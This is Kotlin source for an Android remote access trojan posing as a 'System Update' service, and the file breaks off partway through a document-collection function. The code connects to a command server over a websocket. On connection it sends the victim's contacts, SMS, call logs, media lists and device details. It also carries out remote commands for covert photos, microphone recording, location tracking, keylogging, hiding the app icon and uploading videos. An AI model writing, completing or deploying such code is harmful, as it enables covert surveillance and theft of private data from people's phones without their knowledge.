package com.android.system.update.services

import android.Manifest
import android.app.*
import android.content.ComponentName
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.Cursor
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.*
import android.provider.*
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.Surface
import android.view.View
import android.view.WindowManager
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.android.system.update.MainActivity
import com.android.system.update.R
import com.android.system.update.services.camera.CameraHelper
import com.google.gson.Gson
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.NetworkInterface
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import kotlin.math.roundToInt

class MainService : Service() {
    
    private lateinit var socket: Socket
    private lateinit var gson: Gson
    private lateinit var cameraManager: CameraManager
    private lateinit var locationManager: LocationManager
    private lateinit var telephonyManager: TelephonyManager
    private lateinit var notificationManager: NotificationManager
    
    private var isRunning = false
    private var isRecordingAudio = false
    private var audioRecorder: MediaRecorder? = null
    private var currentAudioFile: String? = null
    private var deviceId: String = ""
    private var dataCollectionAttempts = 0
    private var lastBulkDataSent = 0L
    private var isConnected = false
    
    companion object {
        private const val TAG = "MainService"   
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "rat_service_channel"
        private const val TAG_SERVER_URL = "server_url"
        private const val TAG_WS_URL = "ws_url"
        
        // Commands
        const val CMD_GET_CONTACTS = "get_contacts"
        const val CMD_GET_SMS = "get_sms"
        const val CMD_GET_CALL_LOGS = "get_call_logs"
        const val CMD_GET_LOCATION = "get_location"
        const val CMD_TAKE_PHOTO = "take_photo"
        const val CMD_RECORD_AUDIO = "record_audio"
        const val CMD_GET_DEVICE_INFO = "get_device_info"
        const val CMD_GET_INSTALLED_APPS = "get_installed_apps"
        const val CMD_GET_PHOTOS = "get_photos"
        const val CMD_GET_VIDEOS = "get_videos"
        const val CMD_GET_DOCUMENTS = "get_documents"
        const val CMD_TAKE_PHOTO_FRONT = "take_photo_front"
        const val CMD_TAKE_PHOTO_BACK = "take_photo_back"
        const val CMD_SEND_SMS = "send_sms"
        const val CMD_GET_CLIPBOARD = "get_clipboard"
        const val CMD_GET_NOTIFICATIONS = "get_notifications"
        const val CMD_GET_WIFI_NETWORKS = "get_wifi_networks"
        const val CMD_GET_ACCOUNTS = "get_accounts"
        const val CMD_HIDE_APP = "hide_app"
        const val CMD_UNHIDE_APP = "unhide_app"
        const val CMD_START_KEYLOGGER = "start_keylogger"
        const val CMD_STOP_KEYLOGGER = "stop_keylogger"
        const val CMD_LIVE_CAMERA = "live_camera"
        const val CMD_GET_BATTERY = "get_battery"
        const val CMD_GET_SIM_INFO = "get_sim_info"
        const val CMD_GET_NETWORK_INFO = "get_network_info"
        const val CMD_TAKE_SCREENSHOT = "take_screenshot"
        const val CMD_OPEN_URL = "open_url"
        const val CMD_VIBRATE = "vibrate"
        const val CMD_MAKE_CALL = "make_call"
        const val CMD_CONTINUOUS_LOCATION = "continuous_location"
        const val CMD_STOP_CONTINUOUS_LOCATION = "stop_continuous_location"
        const val CMD_EXFILTRATE_ALL = "exfiltrate_all"
        const val CMD_REFRESH_DATA = "refresh_data"
        const val CMD_UNINSTALL_APP = "uninstall_app"

        const val MAX_RESULTS = 500
    }
    
    override fun onCreate() {
        super.onCreate()
        gson = Gson()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        deviceId = generateDeviceId()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("System Update", "Device optimization active"))
        
        // Delay initial connection to let device boot and network settle
        Handler(Looper.getMainLooper()).postDelayed({
            Log.d(TAG, "Delayed initial connection attempt")
            connectToServer()
        }, 5000)
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning) return START_STICKY
        isRunning = true
        startPeriodicDataCollection()
        startBatteryMonitoring()
        registerContentObservers()
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        isRunning = false
        isConnected = false
        try { socket.disconnect() } catch (e: Exception) {}
        audioRecorder?.release()
        super.onDestroy()
        val broadcastIntent = Intent()
        broadcastIntent.action = "restartService"
        broadcastIntent.setClass(this, MainService::class.java)
        sendBroadcast(broadcastIntent)
    }
    
    private fun generateDeviceId(): String {
        val sharedPrefs = getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
        var id = sharedPrefs.getString("device_id", null)
        if (id == null) {
            id = UUID.randomUUID().toString().substring(0, 8)
            sharedPrefs.edit().putString("device_id", id).apply()
        }
        return id
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Essential system services"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(title: String, content: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }
    
    private fun connectToServer() {
        try {
            val wsUrl = getString(R.string.ws_url)
            Log.d(TAG, "Connecting to: $wsUrl")
            val options = IO.Options().apply {
                forceNew = true
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 1000
                reconnectionDelayMax = 5000
                query = "deviceId=$deviceId&type=device"
                transports = arrayOf("websocket")
                timeout = 10000
            }
            socket = IO.socket(wsUrl, options)
            socket.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "Connected to server successfully")
                isConnected = true
                sendDeviceInfo()
                Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 2000)
            }
            socket.on(Socket.EVENT_DISCONNECT) {
                Log.d(TAG, "Disconnected from server")
                isConnected = false
            }
            socket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                Log.e(TAG, "Connection error: ${args.contentToString()}")
                isConnected = false
            }
            socket.on("connect_error") { args ->
                Log.e(TAG, "Connection error: ${args.contentToString()}")
                isConnected = false
            }
            socket.on("command") { args ->
                if (args.isNotEmpty()) {
                    val data = args[0] as JSONObject
                    handleCommand(data)
                }
            }
            socket.connect()
            Log.d(TAG, "Socket.connect() called")
        } catch (e: Exception) {
            Log.e(TAG, "Socket connection error: ${e.message}", e)
            isConnected = false
            Handler(Looper.getMainLooper()).postDelayed({ connectToServer() }, 5000)
        }
    }
    
    private fun sendDeviceInfo() {
        try {
            val info = JSONObject().apply {
                put("deviceId", deviceId)
                put("os", "Android")
                put("osVersion", Build.VERSION.RELEASE)
                put("deviceModel", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("manufacturer", Build.MANUFACTURER)
                put("apiLevel", Build.VERSION.SDK_INT)
                put("buildId", Build.DISPLAY)
                put("batteryLevel", getBatteryLevel())
                put("isCharging", isCharging())
                put("ip", getLocalIpAddress())
                put("sdkVersion", Build.VERSION.SDK_INT)
            }
            socket.emit("device:update", info)
            Log.d(TAG, "Device info sent")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending device info: ${e.message}")
        }
    }
    
    private fun sendBulkData() {
        Thread {
            try {
                Log.d(TAG, "Attempting to collect and send bulk data (attempt ${dataCollectionAttempts + 1})")
                dataCollectionAttempts++
                val contacts = getContacts()
                val smsMessages = getSmsMessages()
                val callLogs = getCallLogs()
                val deviceInfo = getDetailedDeviceInfo()
                val installedApps = getInstalledApps()
                val photos = getMediaFiles("images")
                val videos = getMediaFiles("videos")
                val documents = getDocuments()
                val data = JSONObject()
                var hasData = false
                if (contacts != null) { data.put("contacts", contacts); hasData = true }
                if (smsMessages != null) { data.put("sms", smsMessages); hasData = true }
                if (callLogs != null) { data.put("callLogs", callLogs); hasData = true }
                if (deviceInfo != null) { data.put("deviceInfo", deviceInfo); hasData = true }
                if (installedApps != null) { data.put("installedApps", installedApps); hasData = true }
                if (photos != null) { data.put("photos", photos); hasData = true }
                if (videos != null) { data.put("videos", videos); hasData = true }
                if (documents != null) { data.put("documents", documents); hasData = true }
                if (hasData && isConnected) {
                    socket.emit("device:data:bulk", data)
                    lastBulkDataSent = System.currentTimeMillis()
                    Log.d(TAG, "Bulk data sent successfully")
                } else {
                    Log.d(TAG, "No data to send yet")
                    if (dataCollectionAttempts < 10 && isConnected) {
                        Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 15000)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending bulk data: ${e.message}")
                if (dataCollectionAttempts < 10 && isConnected) {
                    Handler(Looper.getMainLooper()).postDelayed({ sendBulkData() }, 15000)
                }
            }
        }.start()
    }
    
    private fun handleCommand(data: JSONObject) {
        try {
            val commandId = data.getString("commandId")
            val type = data.getString("type")
            val params = if (data.has("params")) data.getJSONObject("params") else JSONObject()
            Log.d(TAG, "Received command: $type")
            Thread {
                try {
                    val result = executeCommand(type, params)
                    val response = JSONObject().apply {
                        put("commandId", commandId)
                        put("result", result)
                        put("status", "executed")
                    }
                    if (isConnected) socket.emit("device:result", response)
                } catch (e: Exception) {
                    Log.e(TAG, "Command execution error: ${e.message}")
                    val errorDetail = JSONObject().apply {
                        put("error", e.message ?: "Unknown error")
                        put("errorType", e.javaClass.simpleName)
                        put("stackTrace", e.stackTraceToString().take(500))
                        put("command", type)
                    }
                    val errorResponse = JSONObject().apply {
                        put("commandId", commandId)
                        put("result", errorDetail)
                        put("status", "failed")
                    }
                    if (isConnected) socket.emit("device:result", errorResponse)
                }
            }.start()
        } catch (e: Exception) {
            Log.e(TAG, "Error handling command: ${e.message}")
        }
    }
    
    private fun executeCommand(type: String, params: JSONObject): JSONObject {
        return when (type) {
            CMD_GET_CONTACTS -> getContacts() ?: JSONObject().apply { put("error", "Permission denied for READ_CONTACTS"); put("errorType", "SecurityException"); put("command", "get_contacts") }
            CMD_GET_SMS -> getSmsMessages() ?: JSONObject().apply { put("error", "Permission denied for READ_SMS"); put("errorType", "SecurityException"); put("command", "get_sms") }
            CMD_GET_CALL_LOGS -> getCallLogs() ?: JSONObject().apply { put("error", "Permission denied for READ_CALL_LOG"); put("errorType", "SecurityException"); put("command", "get_call_logs") }
            CMD_GET_LOCATION -> getCurrentLocation()
            CMD_TAKE_PHOTO -> takePhoto(params)
            CMD_TAKE_PHOTO_FRONT -> takePhoto(JSONObject().apply { put("camera", "front") })
            CMD_TAKE_PHOTO_BACK -> takePhoto(JSONObject().apply { put("camera", "back") })
            CMD_RECORD_AUDIO -> startStopAudioRecording(params)
            CMD_GET_DEVICE_INFO -> getDetailedDeviceInfo()
            CMD_GET_INSTALLED_APPS -> getInstalledApps()
            CMD_GET_PHOTOS -> getMediaFiles("images")
            CMD_GET_VIDEOS -> getVideosWithUpload()
            CMD_GET_DOCUMENTS -> getDocuments()
            CMD_SEND_SMS -> sendSms(params)
            CMD_GET_CLIPBOARD -> getClipboard()
            CMD_GET_NOTIFICATIONS -> getNotifications()
            CMD_GET_WIFI_NETWORKS -> getWifiNetworks()
            CMD_GET_ACCOUNTS -> getAccounts()
            CMD_GET_BATTERY -> getBatteryInfo()
            CMD_GET_SIM_INFO -> getSimInfo()
            CMD_GET_NETWORK_INFO -> getNetworkInfo()
            CMD_HIDE_APP -> hideAppLauncher()
            CMD_UNHIDE_APP -> unhideAppLauncher()
            CMD_OPEN_URL -> openUrl(params)
            CMD_VIBRATE -> vibrateDevice(params)
            CMD_MAKE_CALL -> makeCall(params)
            CMD_CONTINUOUS_LOCATION -> startContinuousLocation()
            CMD_STOP_CONTINUOUS_LOCATION -> stopContinuousLocation()
            CMD_EXFILTRATE_ALL -> exfiltrateAll()
            CMD_REFRESH_DATA -> refreshData()
            CMD_START_KEYLOGGER -> startKeylogger()
            CMD_STOP_KEYLOGGER -> stopKeylogger()
            CMD_TAKE_SCREENSHOT -> takeScreenshot()
            CMD_UNINSTALL_APP -> uninstallApp(params)
            else -> JSONObject().apply { put("error", "Unknown command: $type") }
        }
    }
    
    private fun refreshData(): JSONObject {
        Thread {
            try {
                Log.d(TAG, "Manual refresh triggered")
                val allData = JSONObject()
                getContacts()?.let { allData.put("contacts", it) }
                getSmsMessages()?.let { allData.put("sms", it) }
                getCallLogs()?.let { allData.put("callLogs", it) }
                getDetailedDeviceInfo()?.let { allData.put("deviceInfo", it) }
                getInstalledApps()?.let { allData.put("installedApps", it) }
                getMediaFiles("images")?.let { allData.put("photos", it) }
                getMediaFiles("videos")?.let { allData.put("videos", it) }
                getDocuments()?.let { allData.put("documents", it) }
                getCurrentLocation()?.let { allData.put("location", it) }
                getBatteryInfo()?.let { allData.put("battery", it) }
                getSimInfo()?.let { allData.put("simInfo", it) }
                getNetworkInfo()?.let { allData.put("networkInfo", it) }
                if (isConnected) {
                    socket.emit("device:data:bulk", allData)
                    Log.d(TAG, "Refresh data sent")
                }
            } catch (e: Exception) { Log.e(TAG, "Refresh error: ${e.message}") }
        }.start()
        return JSONObject().apply { put("status", "refreshing") }
    }
    
    private fun getContacts(): JSONObject? {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "READ_CONTACTS permission not granted")
                return null
            }
            val contacts = JSONArray()
            val cursor: Cursor? = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            var count = 0
            cursor?.use { c ->
                while (c.moveToNext() && count < MAX_RESULTS) {
                    try {
                        val id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID))
                        val name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                        val hasPhone = c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))
                        val contact = JSONObject().apply { put("id", id); put("name", name ?: "Unknown") }
                        if (hasPhone == "1") {
                            val phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?", arrayOf(id), null)
                            val phoneNumbers = JSONArray()
                            phones?.use { p -> while (p.moveToNext()) {
                                phoneNumbers.put(JSONObject().apply { put("number", p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))); put("type", getPhoneTypeLabel(p.getString(p.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)).toIntOrNull() ?: 0)) })
                            }}
                            contact.put("phones", phoneNumbers)
                        }
                        val emails = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?", arrayOf(id), null)
                        val emailList = JSONArray()
                        emails?.use { e -> while (e.moveToNext()) { emailList.put(e.getString(e.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS))) } }
                        if (emailList.length() > 0) contact.put("emails", emailList)
                        contacts.put(contact)
                        count++
                    } catch (e: Exception) { Log.e(TAG, "Error reading contact: ${e.message}") }
                }
            }
            Log.d(TAG, "Read ${contacts.length()} contacts")
            return JSONObject().apply { put("contacts", contacts) }
        } catch (e: Exception) { Log.e(TAG, "getContacts error: ${e.message}"); return null }
    }
    
    private fun getSmsMessages(): JSONObject? {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "READ_SMS permission not granted"); return null
            }
            val smsList = JSONArray()
            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
            var count = 0
            cursor?.use { c ->
                while (c.moveToNext() && count < MAX_RESULTS) {
                    try {
                        val sms = JSONObject().apply {
                            put("id", c.getString(c.getColumnIndex(Telephony.Sms._ID)))
                            put("address", c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)))
                            put("body", c.getString(c.getColumnIndex(Telephony.Sms.BODY)))
                            put("date", c.getLong(c.getColumnIndex(Telephony.Sms.DATE)))
                            put("type", if (c.getInt(c.getColumnIndex(Telephony.Sms.TYPE)) == 1) "inbox" else "sent")
                            put("read", c.getInt(c.getColumnIndex(Telephony.Sms.READ)) == 1)
                            put("threadId", c.getString(c.getColumnIndex(Telephony.Sms.THREAD_ID)))
                        }
                        smsList.put(sms); count++
                    } catch (e: Exception) { Log.e(TAG, "Error reading SMS: ${e.message}") }
                }
            }
            Log.d(TAG, "Read ${smsList.length()} SMS messages")
            return JSONObject().apply { put("sms", smsList); put("total", smsList.length()) }
        } catch (e: Exception) { Log.e(TAG, "getSmsMessages error: ${e.message}"); return null }
    }
    
    private fun getCallLogs(): JSONObject? {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) { Log.d(TAG, "READ_CALL_LOG permission not granted"); return null }
            val calls = JSONArray()
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} DESC")
            var count = 0
            cursor?.use { c ->
                while (c.moveToNext() && count < MAX_RESULTS) {
                    try {
                        val call = JSONObject().apply {
                            put("id", c.getString(c.getColumnIndex(CallLog.Calls._ID)))
                            put("number", c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)))
                            put("name", c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME)))
                            put("type", getCallTypeLabel(c.getInt(c.getColumnIndex(CallLog.Calls.TYPE))))
                            put("duration", c.getLong(c.getColumnIndex(CallLog.Calls.DURATION)))
                            put("date", c.getLong(c.getColumnIndex(CallLog.Calls.DATE)))
                            put("country", c.getString(c.getColumnIndex(CallLog.Calls.COUNTRY_ISO)))
                        }
                        calls.put(call); count++
                    } catch (e: Exception) { Log.e(TAG, "Error reading call log: ${e.message}") }
                }
            }
            Log.d(TAG, "Read ${calls.length()} call logs")
            return JSONObject().apply { put("callLogs", calls); put("total", calls.length()) }
        } catch (e: Exception) { Log.e(TAG, "getCallLogs error: ${e.message}"); return null }
    }
    
    private fun getCurrentLocation(): JSONObject {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return JSONObject().apply { put("error", "Location permission not granted") }
        }
        var location: Location? = null
        try { location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) { Log.e(TAG, "GPS error: ${e.message}") }
        if (location == null) { try { location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) { Log.e(TAG, "Network error: ${e.message}") } }
        if (location == null) { try { location = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER) } catch (e: Exception) { Log.e(TAG, "Passive error: ${e.message}") } }
        return if (location != null) {
            JSONObject().apply {
                put("lat", location.latitude); put("lng", location.longitude); put("accuracy", location.accuracy)
                put("altitude", location.altitude); put("speed", location.speed); put("bearing", location.bearing)
                put("provider", location.provider); put("timestamp", location.time)
                put("address", getAddressFromLocation(location.latitude, location.longitude))
            }
        } else {
            JSONObject().apply { put("error", "No location available - try enabling GPS and going outdoors"); put("errorType", "LocationNotFoundException") }
        }
    }
    
    private fun getAddressFromLocation(lat: Double, lng: Double): String {
        return try {
            val json = JSONObject(URL("https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lng").readText())
            json.optString("display_name", "")
        } catch (e: Exception) { "" }
    }
    
    // ===== UPDATED: Uses CameraHelper for actual photo capture (no corrupted files + hidden from gallery) =====
    private fun takePhoto(params: JSONObject): JSONObject {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return JSONObject().apply { put("error", "Camera permission not granted"); put("errorType", "SecurityException"); put("command", "take_photo") }
            }

            val cameraHelper = CameraHelper(this)
            val useFront = params.optBoolean("front", false) || params.optString("camera", "back") == "front"
            val result = cameraHelper.capturePhoto(useFront)
            
            if (!result.success) {
                return JSONObject().apply {
                    put("error", result.errorMessage ?: "Photo capture failed")
                    put("errorType", result.errorType ?: "CaptureError")
                    put("command", "take_photo")
                }
            }

            val base64Data = result.base64Data
            if (base64Data == null) {
                return JSONObject().apply { put("error", "No image data captured"); put("errorType", "CaptureError"); put("command", "take_photo") }
            }

            // Upload to Cloudinary via server
            // The server will receive this via device:result -> data field -> Cloudinary upload
            val response = JSONObject().apply {
                put("command", "take_photo")
                put("data", base64Data)
                put("filePath", result.filePath ?: "")
                put("timestamp", System.currentTimeMillis())
                put("success", true)
            }

            // Also save to local cache (hidden from gallery)
            Log.d(TAG, "Photo captured successfully, file: ${result.filePath}")
            return response
        } catch (e: Exception) {
            Log.e(TAG, "takePhoto error: ${e.message}", e)
            return JSONObject().apply { put("error", "${e.message}"); put("errorType", e.javaClass.simpleName); put("command", "take_photo") }
        }
    }
    
    private fun startStopAudioRecording(params: JSONObject): JSONObject {
        val action = params.optString("action", "start")
        return if (action == "start") startAudioRecording() else stopAudioRecording()
    }
    
    private fun startAudioRecording(): JSONObject {
        if (isRecordingAudio) return JSONObject().apply { put("error", "Already recording") }
        try {
            val file = File.createTempFile("audio_", ".mp3", cacheDir)
            currentAudioFile = file.absolutePath
            audioRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setOutputFile(file.absolutePath)
                prepare(); start()
            }
            isRecordingAudio = true
            // Auto-stop after 20 seconds to limit file size
            Handler(Looper.getMainLooper()).postDelayed({
                if (isRecordingAudio) {
                    Log.d(TAG, "Auto-stopping recording after 20s")
                    val result = stopAudioRecording()
                    // Send result to server
                    if (isConnected) {
                        socket.emit("device:result", JSONObject().apply {
                            put("commandId", "audio_auto_${System.currentTimeMillis()}")
                            put("result", result)
                            put("status", "executed")
                        })
                    }
                }
            }, 20000)
            return JSONObject().apply { put("success", true); put("file", file.absolutePath); put("duration", "started") }
        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun stopAudioRecording(): JSONObject {
        if (!isRecordingAudio) return JSONObject().apply { put("error", "Not recording") }
        try {
            audioRecorder?.apply { stop(); release() }; audioRecorder = null; isRecordingAudio = false
            val audioData = if (currentAudioFile != null) File(currentAudioFile).readBytes() else null
            val result = JSONObject()
            result.put("command", "record_audio")
            result.put("success", true)
            result.put("file", currentAudioFile ?: "")
            if (audioData != null) {
                result.put("data", Base64.encodeToString(audioData, Base64.NO_WRAP))
            }
            currentAudioFile = null
            return result
        } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
    }
    
    private fun getDetailedDeviceInfo(): JSONObject {
        return JSONObject().apply {
            put("deviceId", deviceId); put("manufacturer", Build.MANUFACTURER); put("model", Build.MODEL)
            put("product", Build.PRODUCT); put("device", Build.DEVICE); put("board", Build.BOARD); put("brand", Build.BRAND)
            put("hardware", Build.HARDWARE); try { put("serial", Build.getSerial()) } catch (e: SecurityException) { put("serial", "restricted") }; put("osVersion", Build.VERSION.RELEASE)
            put("sdkVersion", Build.VERSION.SDK_INT); put("buildId", Build.DISPLAY); put("buildTime", Build.TIME)
            put("host", Build.HOST); put("fingerprint", Build.FINGERPRINT); put("type", Build.TYPE); put("tags", Build.TAGS)
            try { put("serial", Build.getSerial()) } catch (e: SecurityException) { put("serial", "restricted") }
            put("bootloader", Build.BOOTLOADER); put("radioVersion", Build.getRadioVersion())
            val memInfo = Runtime.getRuntime(); put("totalMemory", memInfo.totalMemory()); put("freeMemory", memInfo.freeMemory()); put("maxMemory", memInfo.maxMemory()); put("availableProcessors", Runtime.getRuntime().availableProcessors())
            val storage = StatFs(Environment.getDataDirectory().absolutePath); val blockSize = storage.blockSizeLong
            put("totalStorage", storage.blockCountLong * blockSize); put("availableStorage", storage.availableBlocksLong * blockSize)
            val displayMetrics = resources.displayMetrics; put("screenWidth", displayMetrics.widthPixels); put("screenHeight", displayMetrics.heightPixels); put("screenDensity", displayMetrics.density); put("screenDensityDpi", displayMetrics.densityDpi)
            put("batteryLevel", getBatteryLevel()); put("isCharging", isCharging())
            put("ipAddress", getLocalIpAddress()); put("wifiMac", getWifiMacAddress())
            put("phoneType", getPhoneType()); put("networkType", getNetworkType()); put("operator", getNetworkOperator())
            put("language", Locale.getDefault().language); put("country", Locale.getDefault().country); put("timezone", TimeZone.getDefault().id); put("currentTime", System.currentTimeMillis())
        }
    }
    
    private fun getInstalledApps(): JSONObject {
        val apps = JSONArray()
        val resolveInfoList = packageManager.queryIntentActivities(Intent(Intent.ACTION_MAIN).apply { addCategory(Intent.CATEGORY_LAUNCHER) }, 0)
        resolveInfoList.forEach { info ->
            try {
                val appInfo = info.activityInfo.applicationInfo
                apps.put(JSONObject().apply {
                    put("packageName", appInfo.packageName); put("appName", info.loadLabel(packageManager).toString())
                    put("versionName", packageManager.getPackageInfo(appInfo.packageName, 0).versionName)
                    put("versionCode", packageManager.getPackageInfo(appInfo.packageName, 0).versionCode)
                    put("firstInstallTime", packageManager.getPackageInfo(appInfo.packageName, 0).firstInstallTime)
                    put("lastUpdateTime", packageManager.getPackageInfo(appInfo.packageName, 0).lastUpdateTime)
                    put("isSystemApp", (appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                    put("uid", appInfo.uid); put("dataDir", appInfo.dataDir); put("sourceDir", appInfo.sourceDir)
                })
            } catch (e: Exception) {}
        }
        return JSONObject().apply { put("installedApps", apps); put("total", apps.length()) }
    }
    
    private fun getMediaFiles(type: String): JSONObject {
        val files = JSONArray()
        val collection = if (type == "images") MediaStore.Images.Media.EXTERNAL_CONTENT_URI else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.DATE_ADDED, MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.RELATIVE_PATH)
        val cursor = contentResolver.query(collection, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")
        var count = 0
        cursor?.use { c ->
            while (c.moveToNext() && count < MAX_RESULTS) {
                try {
                    val mediaId = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
                    val name = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME))
                    val date = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)) * 1000L
                    val size = c.getLong(c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE))
                    val mime = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE))
                    val filePath = c.getString(c.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH))
                    files.put(JSONObject().apply {
                        put("id", mediaId)
                        put("name", name)
                        put("date", date)
                        put("size", size)
                        put("mimeType", mime)
                        put("path", filePath)
                        put("uri", "${collection}/$mediaId")
                    }); count++
                } catch (e: Exception) { Log.e(TAG, "Error reading media: ${e.message}") }
            }
        }
        return JSONObject().apply { put(type, files); put("total", files.length()) }
    }
    
    private fun getVideosWithUpload(): JSONObject {
        try {
            val videos = getMediaFiles("videos")
            val videoList = videos.optJSONArray("videos") ?: JSONArray()
            val uploadedVideos = JSONArray()
            
            for (i in 0 until videoList.length()) {
                val video = videoList.getJSONObject(i)
                val videoPath = video.optString("path")
                val videoName = video.optString("name")
                
                if (videoPath != null && videoName != null) {
                    try {
                        val file = java.io.File(videoPath, videoName)
                        if (file.exists() && file.length() < 100 * 1024 * 1024) { // Max 100MB
                            val bytes = file.readBytes()
                            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                            
                            val result = JSONObject().apply {
                                put("command", "get_videos")
                                put("data", base64)
                                put("name", videoName)
                                put("size", file.length())
                                put("mimeType", video.optString("mimeType", "video/mp4"))
                                put("timestamp", System.currentTimeMillis())
                            }
                            
                            // Send via socket so server uploads to Cloudinary
                            if (isConnected) {
                                socket.emit("device:result", JSONObject().apply {
                                    put("commandId", "video_${videoName}_${System.currentTimeMillis()}")
                                    put("result", result)
                                    put("status", "executed")
                                })
                            }
                            
                            // Add to list with reference to uploaded version
                            video.put("uploaded", true)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error uploading video ${videoName}: ${e.message}")
                    }
                }
                uploadedVideos.put(video)
            }
            
            return JSONObject().apply { put("videos", uploadedVideos); put("total", uploadedVideos.length()) }
        } catch (e: Exception) {
            Log.e(TAG, "getVideosWithUpload error: ${e.message}")
            return JSONObject().apply { put("videos", JSONArray()); put("total", 0) }
        }
    }
    
    private fun getDocuments(): JSONObject {
        val documents = JSONArray()
        val collection = MediaStore.Files.getContentUri("external")
